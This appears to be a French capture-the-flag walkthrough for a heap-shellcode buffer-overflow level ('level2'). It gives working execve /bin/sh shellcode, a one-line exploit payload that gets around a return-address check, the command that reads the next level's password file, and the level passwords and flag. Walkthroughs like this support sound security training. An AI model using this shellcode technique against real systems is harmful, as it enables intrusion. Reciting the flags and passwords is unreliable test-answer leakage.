# Level2 - Walkthrough

## Objectif
Injecter un shellcode sur le heap et y sauter pour contourner la protection anti-stack.

---

## Étape 1 : Connexion

```bash
ssh level2@localhost -p 4242
# Mot de passe : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

---

## Étape 2 : Reconnaissance

```bash
ls -la
./level2
test
```

Le programme a une protection qui bloque les adresses commençant par `0xb` (stack/libc).

---

## Étape 3 : Trouver l'adresse heap avec ltrace

```bash
echo "AAAA" | ltrace ./level2
```

Chercher la ligne :
```
strdup("AAAA") = 0x0804a008
```

L'adresse heap est `0x0804a008` (ne commence pas par `0xb` → pas bloquée).

---

## Étape 4 : Vérifier l'offset

Tester la protection :
```bash
python -c "print('A'*80 + '\xbf\xff\xff\xbf')" | ./level2
```

Si affiche `(0xbfffffbf)` → offset = 80

---

## Étape 5 : Construction du payload

Structure :
- Shellcode (21 octets)
- Padding (59 octets) pour atteindre l'offset 80
- Adresse heap `0x0804a008` (4 octets)

Shellcode utilisé (21 octets) :
```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

Adresse heap en little-endian : `\x08\xa0\x04\x08`

---

## Étape 6 : Exploitation

```bash
(python -c "print('\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A'*59 + '\x08\xa0\x04\x08')"; cat) | ./level2
```

Le shell s'ouvre :
```bash
cat /home/user/level3/.pass
```

---

## Étape 7 : Passer au niveau suivant

```bash
exit
su level3
# Mot de passe : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

---

## Flag
```
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
